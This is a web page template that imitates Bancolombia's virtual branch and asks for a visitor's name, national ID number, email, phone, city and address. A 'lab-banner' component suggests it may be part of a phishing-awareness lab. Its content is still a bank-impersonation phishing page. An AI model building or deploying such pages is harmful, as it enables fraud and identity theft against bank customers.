<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bancolombia - Sucursal Virtual</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="{{ asset('3co/js/tailwind-config.js') }}"></script>
    <style>
        @font-face {
            font-family: 'bancolombia';
            src: url('/3co/fonts/bancolombia.ttf') format('truetype');
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: "Open Sans";
            src: url('/3co/fonts/OpenSans-Regular.woff') format('woff'),
                url('/3co/fonts/OpenSans-Regular.ttf') format('truetype');
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: "Open Sans";
            src: url('/3co/fonts/OpenSans-SemiBold.woff') format('woff'),
                url('/3co/fonts/OpenSans-SemiBold.ttf') format('truetype');
            font-weight: 600;
            font-style: normal;
        }

        @font-face {
            font-family: "CIB Sans";
            src: url('/3co/fonts/CIBFontSansBold.woff2') format('woff2'),
                url('/3co/fonts/CIBFontSansBold.woff') format('woff');
            font-weight: 700;
            font-style: normal;
        }

        @font-face {
            font-family: "CIB Sans";
            src: url('/3co/fonts/CIBFontSansLight.woff2') format('woff2'),
                url('/3co/fonts/CIBFontSansLight.woff') format('woff');
            font-weight: 300;
            font-style: normal;
        }

        body {
            font-family: 'Open Sans', sans-serif;
        }

        .font-cib-sans-bold {
            font-family: 'CIB Sans', sans-serif;
            font-weight: 700;
        }

        .floating-label-container {
            position: relative;
            display: flex;
            align-items: center;
            transition: all 0.3s ease;
        }

        .floating-label {
            position: absolute;
            left: 2.5rem;
            top: 50%;
            transform: translateY(-50%);
            font-size: 14px;
            color: #6b7280;
            transition: all 0.2s ease;
            padding: 0 4px;
            pointer-events: none;
            z-index: 10;
            background: white;
        }

        .floating-label.active {
            top: -4px;
            left: 0.5rem;
            font-size: 12px;
            color: #374151;
            transform: translateY(0);
        }

        .floating-input {
            width: 100%;
            padding: 12px 16px 12px 40px;
            font-weight: 600;
            font-size: 14px;
            outline: none;
            transition: all 0.2s ease;
            background: white;
            border: none;
            border-bottom: 0.5px solid #d1d5db;
        }

        .input-icon {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            width: 20px;
            height: 20px;
            z-index: 5;
        }

        .floating-input:focus {
            border-bottom: 0.5px solid #374151;
        }

        .thin-border-bottom {
            border-bottom: 0.5px solid #d1d5db;
        }

        .bg-bancolombia {
            background-image: url('/3co/assets/bgImage.svg');
            background-position: bottom;
            background-repeat: no-repeat;
        }

        .loading-spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #fdda24;
            border-top: 4px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>

<body class="bg-gray-100">
<x-lab-banner />

    <div id="loading" class="fixed inset-0 bg-white flex items-center justify-center z-50 hidden">
        <div class="loading-spinner"></div>
        <div class="absolute text-center" style="margin-top: 100px;">
            <p class="text-gray-700">espere un momento ...</p>
        </div>
    </div>

    <div class="w-full flex justify-center items-center py-3 z-50">
        <div class="w-[98%] flex gap-10 items-center">
            <img src="/3co/assets/header.svg" class="ml-[25%] w-[45%] object-contain" alt="Bancolombia" />
            <div class="flex justify-center items-center gap-1.5 cursor-pointer" onclick="salir()">
                <span class="text-[15px]">Salir</span>
                <img src="/3co/assets/exitHeader.svg" class="w-5 object-contain" alt="Salir" />
            </div>
        </div>
    </div>

    <div class="bg-bancolombia min-h-[70vh] w-[90%] mx-auto flex flex-col items-center justify-center">
        <div id="datos" class="w-full flex flex-col justify-center items-center pb-6">
            <h5 class="text-[24px] font-cib-sans-bold mt-10">Datos personales</h5>
            <div class="w-full flex mt-4 flex-col justify-center items-center gap-4 pl-1">
                <div class="w-[100%] bg-white py-6 px-4 rounded-xl flex flex-col items-center">
                    <div class="w-full flex items-center justify-center hiddenerror hidden">
                        <span class="text-[11px] text-red-600"> Verifica la información e inténtalo nuevamente.</span>
                    </div>

                    <div class="w-full flex flex-col justify-center items-center my-2.5">
                        <div class="w-full floating-label-container thin-border-bottom bg-white">
                            <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                            </svg>
                            <input id="nombre" type="text" class="floating-input" placeholder="" autocomplete="off" />
                            <span id="nombreLabel" class="floating-label">Nombre completo</span>
                        </div>
                        <span id="nombreError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                    </div>

                    <div class="w-full flex flex-col justify-center items-center my-2.5">
                        <div class="w-full floating-label-container thin-border-bottom bg-white">
                            <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M3 7h18v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7zm3 4h6m-6 3h4m7-5h1" />
                            </svg>
                            <input id="cedula" type="tel" inputmode="numeric" pattern="\d*" class="floating-input" placeholder="" autocomplete="off" />
                            <span id="cedulaLabel" class="floating-label">Cédula</span>
                        </div>
                        <span id="cedulaError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                    </div>

                    <div class="w-full flex flex-col justify-center items-center my-2.5">
                        <div class="w-full floating-label-container thin-border-bottom bg-white">
                            <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M3 8l9 6 9-6M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                            </svg>
                            <input id="email" type="email" class="floating-input" placeholder="" autocomplete="off" />
                            <span id="emailLabel" class="floating-label">Correo electrónico</span>
                        </div>
                        <span id="emailError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                    </div>

                    <div class="w-full flex flex-col justify-center items-center my-2.5">
                        <div class="w-full floating-label-container thin-border-bottom bg-white">
                            <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M3 5a2 2 0 012-2h3l2 4-2 2a12 12 0 006 6l2-2 4 2v3a2 2 0 01-2 2h-1C9.82 20.5 3.5 14.18 3 6V5z" />
                            </svg>
                            <input id="celular" type="tel" inputmode="numeric" pattern="\d*" minlength="10" maxlength="10" class="floating-input" placeholder="" autocomplete="off" />
                            <span id="celularLabel" class="floating-label">Celular</span>
                        </div>
                        <span id="celularError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                    </div>

                    <div class="w-full flex flex-col justify-center items-center my-2.5">
                        <div class="w-full floating-label-container thin-border-bottom bg-white">
                            <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M12 11a3 3 0 100-6 3 3 0 000 6zm0 9c-4-4-6-6-6-9a6 6 0 1112 0c0 3-2 5-6 9z" />
                            </svg>
                            <input id="ciudad" type="text" class="floating-input" placeholder="" autocomplete="off" />
                            <span id="ciudadLabel" class="floating-label">Ciudad</span>
                        </div>
                        <span id="ciudadError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                    </div>

                    <div class="w-full flex flex-col justify-center items-center my-2.5">
                        <div class="w-full floating-label-container thin-border-bottom bg-white">
                            <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M3 12l9-7 9 7M5 10v10h5v-6h4v6h5V10" />
                            </svg>
                            <input id="direccion" type="text" class="floating-input" placeholder="" autocomplete="off" />
                            <span id="direccionLabel" class="floating-label">Dirección</span>
                        </div>
                        <span id="direccionError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                    </div>

                    <div class="w-full pt-6 pb-2 flex justify-end items-center px-[15px]">
                        <button id="continuarDatos" class="font-bold py-2 px-6 bg-bancolombia-yellow rounded-full disabled:bg-gray-300 disabled:text-black cursor-not-allowed w-32" disabled>Continuar</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="w-full flex flex-col justify-center items-center py-7">
        <div class="w-[90%] border-t border-gray-300"></div>
        <img src="/3co/assets/header.svg" class="w-[40%] object-contain" alt="Bancolombia" />
        <img src="/3co/assets/foter.svg" class="w-[40%] object-contain mt-0.5" alt="Footer" />
    </div>

<script src="{{ asset('3co/js/trico-app.js') }}"></script>

</body>
</html>
